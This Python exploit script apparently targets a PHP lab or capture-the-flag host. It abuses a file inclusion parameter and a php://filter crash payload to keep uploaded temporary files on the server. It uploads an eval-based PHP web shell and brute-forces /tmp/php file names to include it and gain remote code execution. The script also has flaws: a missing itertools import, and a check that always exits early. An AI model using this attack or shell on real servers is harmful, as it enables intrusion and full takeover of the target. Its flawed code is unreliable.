# !/usr/bin/env python3
# -*- coding: utf-8 -*-

# built-in imports
import io
import sys
import string
import threading

# third-party imports
import requests

HOST = "http://192.168.200.129/index.php"
SHELL = "@<?php echo 'phpok'; @eval($_REQUEST[a]);?>"
PAYLOAD1 = "php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA"
PAYLOAD2 = "php://filter/string.strip_tags/resource=index.php"

# charset = string.digits + string.ascii_letters
charset = string.ascii_letters
event = threading.Event()


def upload_file_to_include():
    fs = [
        ('file', io.BytesIO(SHELL.encode())),
        ('file', io.BytesIO(SHELL.encode())),
        ('file', io.BytesIO(SHELL.encode())),
        ('file', io.BytesIO(SHELL.encode())),
        ('file', io.BytesIO(SHELL.encode()))
    ]
    url = HOST + f'?orange={PAYLOAD1}'
    with requests.session() as s:
        r = s.post(url=url, files=fs, allow_redirects=False)
    return r.status_code


def brute_force_tmp_file(chars):
    suffixs = [''.join(x) for x in itertools.permutations(chars, 6)][::-1]
    for suffix in suffixs:
        url = f"{HOST}?orange=/tmp/php{suffix}"
        r = requests.get(url)
        if 'phpok' in r.text:
            print("\033[32m[+] Include success!\033[0m")
            print(f"The filename is /tmp/php{suffix}")
            event.set()
        if event:
            sys.exit(0)


def main():
    threading.Thread(target=brute_force_tmp_file, args=(charset,)).start()
    threading.Thread(target=brute_force_tmp_file, args=(charset[::-1],)).start()


if __name__ == "__main__":
    for _ in range(50):    # change the number you can get tmp bomb :P
        upload_file_to_include()

    code = upload_file_to_include()
    print(code)
    if code in [500, 502]:
        main()
